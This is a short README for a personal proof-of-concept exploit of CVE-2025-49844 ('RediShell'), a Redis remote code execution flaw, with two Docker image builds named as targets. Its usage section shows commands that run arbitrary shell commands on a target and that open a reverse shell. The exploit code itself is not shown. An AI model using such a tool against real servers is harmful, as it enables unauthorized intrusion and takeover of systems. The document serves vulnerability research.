# CVE-2025-49844

My personal proof-of-concept for [CVE-2025-49844], also known as [RediShell].

Supported target builds:
- x86-64 Linux `redis:8.2.1-alpine` Docker image
- x86-64 Linux `redis:8.2.1-bookworm` Docker image

It's a bit clumsy, probably not as good as Wiz Research's. Still, I'm glad I managed to get it working before the Hexacon 2025 talks are uploaded, and I had a great time investigating it.

## Usage

Run one-way shell commands:
```sh
$ uv run cve-2025-49844 command "echo 'hello world' > /data/hello.txt"
```

Connect to a reverse shell:
```sh
$ uv run cve-2025-49844 rshell -l 127.0.0.1 -p 4444
```

[CVE-2025-49844]:https://nvd.nist.gov/vuln/detail/CVE-2025-49844
[RediShell]:https://www.wiz.io/blog/wiz-research-redis-rce-cve-2025-49844
